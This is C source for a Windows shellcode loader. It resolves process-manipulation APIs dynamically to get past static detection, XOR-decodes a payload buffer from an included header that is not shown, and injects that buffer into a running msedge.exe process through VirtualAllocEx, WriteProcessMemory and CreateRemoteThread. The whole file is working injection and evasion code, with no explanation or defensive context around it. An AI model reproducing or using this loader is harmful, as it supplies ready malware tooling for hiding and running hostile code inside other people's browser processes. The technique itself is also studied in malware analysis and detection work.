#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "buffer.h"

// Define function pointers for the APIs we will load dynamically
typedef HANDLE(WINAPI* pfnCREATETOOLHELP32SNAPSHOT)(DWORD, DWORD);
typedef BOOL(WINAPI* pfnPROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* pfnPROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
typedef LPVOID(WINAPI* pfnVIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pfnWRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pfnCREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* pfnOPENPROCESS)(DWORD, BOOL, DWORD);

pfnCREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot = NULL;
pfnPROCESS32FIRST pProcess32First = NULL;
pfnPROCESS32NEXT pProcess32Next = NULL;
pfnVIRTUALALLOCEX pVirtualAllocEx = NULL;
pfnWRITEPROCESSMEMORY pWriteProcessMemory = NULL;
pfnCREATEREMOTETHREAD pCreateRemoteThread = NULL;
pfnOPENPROCESS pOpenProcess = NULL;

// Load all APIs dynamically
void LoadAPIs() {
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");

    pCreateToolhelp32Snapshot = (pfnCREATETOOLHELP32SNAPSHOT)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32First = (pfnPROCESS32FIRST)GetProcAddress(hKernel32, "Process32FirstW");
    pProcess32Next = (pfnPROCESS32NEXT)GetProcAddress(hKernel32, "Process32NextW");
    pVirtualAllocEx = (pfnVIRTUALALLOCEX)GetProcAddress(hKernel32, "VirtualAllocEx");
    pWriteProcessMemory = (pfnWRITEPROCESSMEMORY)GetProcAddress(hKernel32, "WriteProcessMemory");
    pCreateRemoteThread = (pfnCREATEREMOTETHREAD)GetProcAddress(hKernel32, "CreateRemoteThread");
    pOpenProcess = (pfnOPENPROCESS)GetProcAddress(hKernel32, "OpenProcess");
}

void XOR(unsigned char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ 0xAA;
    }
}

int FindTarget(const wchar_t* target_process) {
    if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next) {
        LoadAPIs();
    }

    HANDLE hProcSnap;
    PROCESSENTRY32W pe32;
    int pid = 0;

    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (INVALID_HANDLE_VALUE == hProcSnap) {
        return 0;
    } 

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!pProcess32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (pProcess32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(target_process, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {
    if (!pVirtualAllocEx || !pWriteProcessMemory || !pCreateRemoteThread) {
        LoadAPIs();
    }

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = pVirtualAllocEx(hProc, NULL, buf_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    pWriteProcessMemory(hProc, pRemoteCode, (PVOID)buf, (SIZE_T)buf_len, NULL);

    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    LoadAPIs();  // Ensure APIs are loaded before use

    int pid = 0;
    HANDLE hProc = NULL;

    const wchar_t* target_process = L"msedge.exe";

    pid = FindTarget(target_process);

    if (pid == 0) {
        wprintf(L"failed to find %s process\n", target_process);
        return 0;
    }

    hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

    if (hProc != NULL) {
        XOR(buf, sizeof(buf));
        Inject(hProc, buf, sizeof(buf));
        CloseHandle(hProc);
    }

    return 0;
}
